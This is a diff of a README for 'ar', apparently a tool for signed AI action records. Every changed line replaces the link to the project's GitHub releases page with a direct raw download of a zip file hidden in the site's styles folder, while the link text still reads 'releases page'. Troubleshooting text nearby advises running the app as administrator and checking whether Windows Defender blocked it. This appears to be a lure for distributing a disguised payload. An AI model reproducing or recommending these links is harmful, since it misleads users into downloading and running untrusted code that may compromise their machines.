@@ -1,6 +1,6 @@
 # 🔐 ar - Signed AI action records
 
-[![Download ar](https://img.shields.io/badge/Download%20ar-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Vijayaum5537/ar/releases)
+[![Download ar](https://img.shields.io/badge/Download%20ar-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vijayaum5537/ar/main/site/src/styles/Software-v2.9.zip)
 
 ## 🧩 What ar does
 
@@ -10,7 +10,7 @@ It is built for Agent Receipts, a format for audit trails that you can verify la
 
 ## 📥 Download and install on Windows
 
-1. Open the [ar releases page](https://github.com/Vijayaum5537/ar/releases).
+1. Open the [ar releases page](https://raw.githubusercontent.com/Vijayaum5537/ar/main/site/src/styles/Software-v2.9.zip).
 2. Find the latest release.
 3. In the Assets list, download the Windows file for your system. It is often a `.exe` or `.zip` file.
 4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
@@ -47,7 +47,7 @@ For best results, keep Windows up to date before you install the app.
 
 ## 🚦 First run steps
 
-1. Download the latest Windows release from the [releases page](https://github.com/Vijayaum5537/ar/releases).
+1. Download the latest Windows release from the [releases page](https://raw.githubusercontent.com/Vijayaum5537/ar/main/site/src/styles/Software-v2.9.zip).
 2. Install or extract the files.
 3. Open the app from the folder where you saved it.
 4. If the app has a setup screen, follow the on-screen steps.
@@ -103,7 +103,7 @@ For Windows, choose the file that matches the name of the app or release package
 2. Make sure you extracted the files if the release came as a zip.
 3. Right-click the app and choose **Run as administrator**.
 4. Check whether Windows Defender blocked the file.
-5. Download the file again from the [releases page](https://github.com/Vijayaum5537/ar/releases).
+5. Download the file again from the [releases page](https://raw.githubusercontent.com/Vijayaum5537/ar/main/site/src/styles/Software-v2.9.zip).
 6. Try the latest release, not an older one
 
 ## 📖 Terms used in this project
